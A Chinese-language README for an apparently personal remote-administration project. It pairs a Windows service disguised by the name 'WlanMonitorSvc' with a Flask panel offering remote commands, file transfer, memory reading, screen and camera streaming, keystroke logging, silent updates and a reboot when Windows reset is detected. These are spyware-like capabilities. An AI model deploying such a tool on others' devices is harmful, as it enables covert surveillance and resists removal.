# Controller

![License: MIT](https://img.shields.io/badge/License-MIT-blue.svg)
![Client: C++20](https://img.shields.io/badge/Client-C%2B%2B20-blue.svg)
![Server: Flask](https://img.shields.io/badge/Server-Flask-green.svg)
![Platform: Windows](https://img.shields.io/badge/Client-Windows-informational.svg)

Controller 是一个自用的远程设备管理项目，由 Windows 客户端服务 `WlanMonitorSvc`、更新器和 Flask 管理端组成。管理端负责设备在线状态、命令队列、文件传输、日志、屏幕/摄像头画面、进程/内存查看和媒体控制；Windows 客户端以服务方式运行并定期向服务端上报状态、拉取命令。

## 功能概览

- **设备总览**：显示设备名、网络、版本、前台 Focus、在线状态和快捷操作。
- **远程终端**：向指定设备或批量设备发送命令，并查看执行结果。
- **文件管理**：浏览远端目录、上传/下载文件、创建目录、删除/重命名文件。
- **任务与内存**：查看进程、任务信息、内存映射和大块内存读取结果。
- **屏幕与摄像头**：按需开启屏幕流或摄像头流，并支持 FPS 调整。
- **日志与按键记录**：查看客户端日志和受控端上报的键盘输入状态。
- **媒体控制**：播放/暂停、上一首/下一首、音量、显示器弹跳等媒体相关操作。
- **更新管理**：上传 `WlanMonitorSvc.exe` 和更新器，服务端根据 EXE 内构建标记发布 stable/test 通道。
- **稳定性保护**：服务启动失败自动重试、服务恢复策略、显示器弹跳命令去重、Focus 中文 UTF-8 传输修正。

## 项目结构

```text
Controller/
├── PowerOFF/                 # Windows 客户端服务 WlanMonitorSvc 源码与 VS 工程
│   ├── PowerOFF.cpp
│   ├── PowerOFF.vcxproj
│   ├── PromptVersion.ps1     # 编译前版本/通道提示脚本
│   └── Decrypt.py            # 本地加密日志辅助解密脚本
├── Updater/                  # 客户端热更新辅助程序
│   ├── Updater.cpp
│   └── Updater.vcxproj
├── Server/                   # Flask 管理端
│   ├── app.py                # 入口，注册所有 Blueprint
│   ├── core.py               # 共享状态、缓存清理、加解密等基础逻辑
│   ├── bp_main.py            # 首页、设备上报、版本管理
│   ├── bp_file.py            # 文件管理
│   ├── bp_terminal.py        # 命令下发与结果读取
│   ├── bp_taskmgr.py         # 任务管理
│   ├── bp_memory.py          # 内存查看
│   ├── bp_screen.py          # 屏幕流
│   ├── bp_camera.py          # 摄像头流
│   ├── bp_log.py             # 日志查看
│   ├── bp_keylog.py          # 按键记录查看
│   ├── bp_entertainment.py   # 媒体控制
│   └── systemd_example.service
├── PowerOFF.slnx             # Visual Studio 解决方案
├── LICENSE.txt
└── README.md
```

## 环境要求

### Windows 客户端/更新器

- Windows 10/11 或 Windows Server。
- Visual Studio 2026/Build Tools，包含 MSVC、Windows SDK 和 MSBuild。
- 项目使用 C++20，工程默认输出名为 `WlanMonitorSvc.exe`。

### Flask 服务端

- Python 3.9+。
- Flask。
- 推荐部署在反向代理或隧道后，并保持 `/update/*`、`/report`、`/cmd_result` 等接口可被客户端访问。

## 构建客户端

在仓库根目录执行：

```powershell
$env:WLANMONITOR_SKIP_VERSION_PROMPT='1'
& "C:\Program Files\Microsoft Visual Studio\18\Community\MSBuild\Current\Bin\MSBuild.exe" `
  PowerOFF\PowerOFF.vcxproj `
  /p:Configuration=Release `
  /p:Platform=x64 `
  /m
```

输出文件：

```text
PowerOFF\x64\Release\WlanMonitorSvc.exe
```

构建前请确认 `PowerOFF/PowerOFF.cpp` 顶部的版本号和通道标记：

```cpp
#define MANUAL_COMPILE_VERSION "x.y.z"
#define MANUAL_BUILD_CHANNEL "stable"
```

如需构建更新器：

```powershell
& "C:\Program Files\Microsoft Visual Studio\18\Community\MSBuild\Current\Bin\MSBuild.exe" `
  Updater\Updater.vcxproj `
  /p:Configuration=Release `
  /p:Platform=x64 `
  /m
```

## 启动服务端

```powershell
cd Server
python -m pip install flask
python app.py
```

默认监听：

```text
http://0.0.0.0:5000
```

登录入口：

```text
/login
```

Linux/systemd 部署时可参考：

```text
Server/systemd_example.service
```

## 常用页面

| 页面 | 用途 |
| --- | --- |
| `/` | 设备列表、版本发布、批量操作 |
| `/terminal/<mac>` | 单设备命令终端 |
| `/files/<mac>` | 文件管理 |
| `/taskmgr/<mac>` | 任务管理器 |
| `/memory/<mac>` | 内存查看器 |
| `/screen/<mac>` | 屏幕画面 |
| `/camera/<mac>` | 摄像头画面 |
| `/view_log/<mac>` | 日志查看 |
| `/keylog/<mac>` | 按键记录 |
| `/entertainment/<mac>` | 媒体控制 |

## 更新发布流程

1. 修改 `MANUAL_COMPILE_VERSION` 和 `MANUAL_BUILD_CHANNEL`。
2. 构建 Release x64 客户端。
3. 打开服务端首页，在 **Client Update** 上传：
   - `WlanMonitorSvc.exe`
   - 可选：`WlanMonitorSvc.updater.exe`
4. 服务端读取 EXE 内的构建标记，并发布到对应 stable/test 通道。
5. 客户端心跳检测到新版本后自动下载更新。

## 本次变更记录

- 修复 Focus 上报中文窗口标题时的 UTF-8 二次转码乱码。
- 增加 Windows 重置/恢复界面检测，检测到后触发重启。
- 增强 Windows 服务恢复配置和启动失败自动重试。
- 优化媒体显示器弹跳命令队列，网页端取消后不再残留旧命令。
- 优化终端命令队列中显示器开关相关命令的优先级和去重。

## 参考资料

- GitHub Docs: [About READMEs](https://docs.github.com/en/repositories/managing-your-repositorys-settings-and-features/customizing-your-repository/about-readmes)
- Microsoft Learn: [Create a README for your Git repo](https://learn.microsoft.com/en-us/azure/devops/repos/git/create-a-readme)
- Microsoft Learn: [WideCharToMultiByte function](https://learn.microsoft.com/en-us/windows/win32/api/stringapiset/nf-stringapiset-widechartomultibyte)

## 许可证

本项目采用 [MIT License](LICENSE.txt)。
